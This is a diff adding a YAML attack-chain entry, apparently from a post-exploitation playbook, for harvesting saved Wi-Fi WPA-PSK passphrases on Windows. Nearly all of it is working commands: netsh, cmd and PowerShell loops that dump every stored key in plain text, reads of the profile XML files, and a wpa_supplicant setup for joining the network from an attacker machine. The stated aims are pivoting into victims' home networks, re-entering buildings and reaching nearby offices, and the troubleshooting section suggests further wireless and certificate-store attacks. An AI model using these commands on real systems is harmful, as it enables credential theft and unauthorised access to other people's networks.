@@ -1,0 +1,74 @@
+chain_id: wifi_profile_extraction
+title: "Windows post — extract saved Wi-Fi WPA-PSK passphrases (netsh)"
+severity: MEDIUM
+tags: [windows, post-exploit, wifi, wpa-psk, netsh, credential-harvest]
+
+trigger:
+  any_of:
+    - { kind: "windows_local_user_shell" }
+    - { kind: "windows_admin_shell" }
+
+description: |
+  Any user-context shell on Windows can list saved Wi-Fi profiles via
+  `netsh wlan show profiles`. Adding `key=clear` to the per-profile
+  query reveals the WPA-PSK in plain text. Useful for: pivoting from
+  a corp laptop to the home user's Wi-Fi (then their other home
+  devices), or harvesting guest-Wi-Fi keys to get back into the
+  building, or turning a single client compromise into wireless
+  access in nearby coffee shops / partner offices.
+
+steps:
+  - id: 1
+    title: "List every saved profile"
+    command: |
+      netsh wlan show profiles
+
+  - id: 2
+    title: "Pull the passphrase for each"
+    command: |
+      for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo Profile:%j & netsh wlan show profile name=%j key=clear | findstr /R /C:"Key Content"
+
+  - id: 3
+    title: "PowerShell one-liner — same effect, cleaner output"
+    command: |
+      (netsh wlan show profiles) | Select-String "All User Profile" | %{ ($_ -split ":")[1].Trim() } | %{
+        $name=$_; $r = netsh wlan show profile name="$name" key=clear
+        $key = ($r | Select-String "Key Content").ToString().Split(":")[1].Trim()
+        "$name -> $key"
+      }
+
+  - id: 4
+    title: "Cross-platform — same data lives in XML on disk"
+    command: |
+      # All profile XMLs (no admin needed for ones the user owns):
+      dir "%PROGRAMDATA%\\Microsoft\\Wlansvc\\Profiles\\Interfaces\\"
+      type "%PROGRAMDATA%\\Microsoft\\Wlansvc\\Profiles\\Interfaces\\<GUID>\\<UUID>.xml"
+
+  - id: 5
+    title: "Connect from your attacker box (if in range)"
+    command: |
+      # Generate a Linux wpa_supplicant.conf:
+      cat > /tmp/wpa.conf <<'CFG'
+      ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
+      network={
+          ssid="<SSID>"
+          psk="<KEY_FROM_STEP_2>"
+      }
+      CFG
+      sudo wpa_supplicant -B -i wlan0 -c /tmp/wpa.conf
+      sudo dhclient wlan0
+
+common_errors:
+  - error: "netsh: 'There is no wireless interface'"
+    solution: |
+      Box has no Wi-Fi adapter (typical for servers). The XMLs may
+      still exist if it was demoted — check `%PROGRAMDATA%` path
+      manually.
+  - error: "Key Content blank for every profile"
+    solution: |
+      Profile uses 802.1X (enterprise auth) — no PSK to recover.
+      Pivot to PMKID / EAP-relay attacks in range, or look for
+      cached cert-store creds via `certutil -store -user My`.
+
+references:
+  - https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-wlan
